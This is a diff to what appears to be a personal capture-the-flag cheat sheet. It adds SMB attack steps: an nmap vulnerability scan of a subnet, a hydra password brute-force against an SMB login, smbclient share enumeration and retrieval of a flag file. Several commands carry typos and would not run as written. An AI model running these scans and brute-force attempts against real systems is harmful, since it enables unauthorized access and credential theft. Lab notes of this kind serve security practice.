@@ -10,3 +10,12 @@ snow -C -p "password" res.txt
 
 python -m SimpleHTTPServer 9000
 python3 -m http.server 9000
+
+SMB -->
+sudo nmap -T4 -Ss -p 139,445 - -script vuln 192.166.0.0/24
+hydra-l henry -P /home/passlist.txt 192.168.0.1 smb
+smbclient -L 192.168.0.1
+smbclient //192.168.0.1/share
+type password and ls
+get sni.txt ~/Desktop/falg2.txt or more sni.txt
+cat falg2.txt
